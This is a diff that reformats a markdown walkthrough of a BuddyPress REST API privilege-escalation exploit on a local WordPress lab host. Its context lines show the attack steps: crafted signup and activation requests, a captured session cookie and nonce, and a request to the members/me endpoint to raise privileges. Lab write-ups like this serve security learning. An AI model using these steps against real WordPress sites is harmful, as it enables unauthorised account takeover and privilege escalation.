@@ -50,7 +50,7 @@ We will craft a request to create an account.
 
 Let's craft the request.
 
-
+**Request**
 ```
 POST /wp-json/buddypress/v1/signup HTTP/1.1
 HOST: 192.168.0.16:7006
@@ -66,7 +66,7 @@ Content-Length: 107
 ```
 
  
-Response
+**Response**
 ```
 Response
 HTTP/1.1 200 OK
@@ -116,7 +116,8 @@ On the buddypress rest api docs, if you scroll down only 2 divs you can find an 
  
 
 Lets craft a request for this endpoint to try and activate the account we just made.
-Request
+
+**Request**
 ``` 
 PUT /wp-json/buddypress/v1/signup/activate/tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L HTTP/1.1
 HOST: 192.168.0.16:7006
@@ -126,7 +127,7 @@ Content-Type: application/json; charset=UTF-8
 {
 }
 ```
-Response
+**Response**
 ``` 
 HTTP/1.1 200 OK
 Date: Wed, 11 Jan 2023 20:57:16 GMT
@@ -177,6 +178,7 @@ Lets create a group
 Use Burp Suite proxy and pause the requests and step over, follow the workflow to create a group, keep your eyes peeled for the X-WP-Nonce and Cookie.
 
 In the first section (Enter Group Name & Description)we find the cookie.
+
 ``` 
 Cookie: wp-settings-time-6=1673475146; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_1be8abdff50a11d493930c4498bcea44=test10%7C1673677770%7CSTA8r35d5LxrbTT1esDeqmnBnzlfEVSPNjacQkAg34s%7C13210b72a8690802f0be7455f6e7ff088c7d8bb305a21dbf389b64fcf6a111aa; wp-settings-time-11=1673504970; bp_new_group_id=29; bp_completed_create_steps=WyJncm91cC1kZXRhaWxzIl0%3D
 ```
@@ -198,6 +200,7 @@ X-WP-Nonce: 8af0f38b91
 Nice, we have found the nonce.
 
 If we now craft this request and send it to the vulnerable endpoint /wp-json/buddypress/v1/members/me we should be able to elevate our privs.
+**Request**
 ``` 
 POST /wp-json/buddypress/v1/members/me HTTP/1.1
 
@@ -217,7 +220,7 @@ Content-Length: 45
 
 The first response will not give the correct return response shown below, send this request again to yield similar results to the response below.
 
-
+**Response**
 ```
 HTTP/1.1 200 OK
 Date: Thu, 12 Jan 2023 06:37:42 GMT
